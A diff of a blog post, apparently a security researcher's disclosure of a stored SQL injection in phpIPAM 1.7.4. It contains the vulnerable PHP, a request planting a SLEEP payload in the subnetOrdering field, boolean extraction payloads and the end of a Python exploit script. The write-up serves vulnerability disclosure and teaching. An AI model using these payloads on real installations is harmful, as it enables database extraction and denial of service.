@@ -66,10 +66,10 @@
     <h1 id="second-order-sql-injection-in-phpipam-174-cve-2026-4189">Second Order SQL Injection in phpIPAM 1.7.4 (CVE-2026-4189)</h1>
 <p>Back in 2022, I found a <a href="/posts/2022-01-20-cve-2022-23046-phpipam/">SQL injection in phpIPAM 1.4.4</a> (CVE-2022-23046) via the BGP mapping search feature. That was a classic, direct SQL injection  user input went straight into a query. This time, I went back to phpIPAM and found something more interesting: a <strong>Second Order SQL Injection</strong> in version <strong>1.7.4</strong>, where the payload is stored first and executed later in a completely different context.</p>
 <h2 id="what-is-a-second-order-sql-injection">What is a Second Order SQL Injection?</h2>
-<p>Most SQL injections are &ldquo;first order&rdquo; the malicious input is sent and executed in the same request. A <strong>second order</strong> (or stored) SQL injection is different:</p>
+<p>Most SQL injections are &quot;first order&quot; the malicious input is sent and executed in the same request. A <strong>second order</strong> (or stored) SQL injection is different:</p>
 <ol>
 <li><strong>First step (storage):</strong> The attacker submits a payload that gets safely stored in the database (escaped for storage, but not validated for SQL keywords).</li>
-<li><strong>Second step (execution):</strong> Later, the application retrieves that stored value and uses it <strong>unsafely</strong> in a different SQL query  that&rsquo;s when the injection fires.</li>
+<li><strong>Second step (execution):</strong> Later, the application retrieves that stored value and uses it <strong>unsafely</strong> in a different SQL query  that's when the injection fires.</li>
 </ol>
 <p>This makes second order SQLi harder to detect because the injection point and the execution point are in completely different parts of the application.</p>
 <h2 id="the-vulnerable-flow">The Vulnerable Flow</h2>
@@ -115,7 +115,7 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$subnets</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">Database</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">getObjectsQuery</span>(<span style="color:#f1fa8c">&#39;subnets&#39;</span>, <span style="color:#8be9fd;font-style:italic">$query</span>, <span style="color:#ff79c6">array</span>(<span style="color:#8be9fd;font-style:italic">$sectionId</span>));
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>The value stored in <code>subnetOrdering</code> is split by comma and <strong>directly concatenated</strong> into the SQL query without any sanitization or whitelist validation. The <code>sectionId</code> uses a prepared statement parameter (<code>?</code>), but <code>$order[0]</code> is raw string interpolation  classic mistake.</p>
-<h3 id="why-cant-we-use-prepared-statements-here">Why can&rsquo;t we use prepared statements here?</h3>
+<h3 id="why-cant-we-use-prepared-statements-here">Why can't we use prepared statements here?</h3>
 <p>This is a common pitfall. PDO prepared statements <strong>cannot parameterize</strong> column names or expressions in <code>ORDER BY</code> clauses:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#6272a4">-- This does NOT work with prepared statements:
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">ORDER</span> <span style="color:#ff79c6">BY</span> <span style="color:#ff79c6">?</span>    <span style="color:#6272a4">-- ❌ PDO treats this as a literal string, not a column
@@ -134,7 +134,7 @@
 </span></span><span style="display:flex;"><span>Content-Type<span style="color:#ff79c6">:</span> application/x-www-form-urlencoded
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>id=1&amp;action=edit&amp;name=Customers&amp;description=Test&amp;subnetOrdering=SLEEP(3)&amp;strictMode=1&amp;showSubnet=1&amp;showVLAN=1&amp;showVRF=1&amp;showSupernetOnly=0&amp;masterSection=0&amp;csrf_cookie=&lt;token&gt;
-</span></span></code></pre></div><p><strong>Step 3:</strong> Visit the section&rsquo;s subnet page and measure response time:</p>
+</span></span></code></pre></div><p><strong>Step 3:</strong> Visit the section's subnet page and measure response time:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ <span style="color:#8be9fd;font-style:italic">time</span> curl <span style="color:#f1fa8c">&#39;http://target/index.php?page=subnets&amp;section=1&#39;</span> <span style="color:#f1fa8c">\
 </span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>  -H <span style="color:#f1fa8c">&#39;Cookie: phpipam=&lt;session&gt;&#39;</span>
 </span></span><span style="display:flex;"><span>
@@ -257,7 +257,7 @@ subnetOrdering=user()&gt;&#39;a&#39; → Is DB user &gt; &#39;a&#39;? Check sort
 </span></span><span style="display:flex;"><span>    app <span style="color:#ff79c6">=</span> IPAM_Position_SQLi(TARGET, USER, PASS)
 </span></span><span style="display:flex;"><span>    app<span style="color:#ff79c6">.</span>exploit()
 </span></span></code></pre></div><h3 id="the-varchar16-constraint">The VARCHAR(16) Constraint</h3>
-<p>The <code>subnetOrdering</code> column is defined as <code>VARCHAR(16)</code>, which severely limits payload length. Here&rsquo;s what fits and what doesn&rsquo;t:</p>
+<p>The <code>subnetOrdering</code> column is defined as <code>VARCHAR(16)</code>, which severely limits payload length. Here's what fits and what doesn't:</p>
 <table>
   <thead>
       <tr>
@@ -321,7 +321,7 @@ DOUBLE value is out of range in &#39;exp(999)&#39;
 </code></pre><h2 id="impact">Impact</h2>
 <ul>
 <li><strong>Authentication Required:</strong>  privileges needed to edit sections.</li>
-<li><strong>Persistent:</strong> The payload stays in the database and fires every time any user views that section&rsquo;s subnets.</li>
+<li><strong>Persistent:</strong> The payload stays in the database and fires every time any user views that section's subnets.</li>
 <li><strong>Blind Data Extraction:</strong> Database user, version, and potentially table contents can be extracted via boolean-based or time-based techniques.</li>
 <li><strong>Denial of Service:</strong> <code>SLEEP()</code> payloads cause significant delays for all users viewing the affected section.</li>
 </ul>
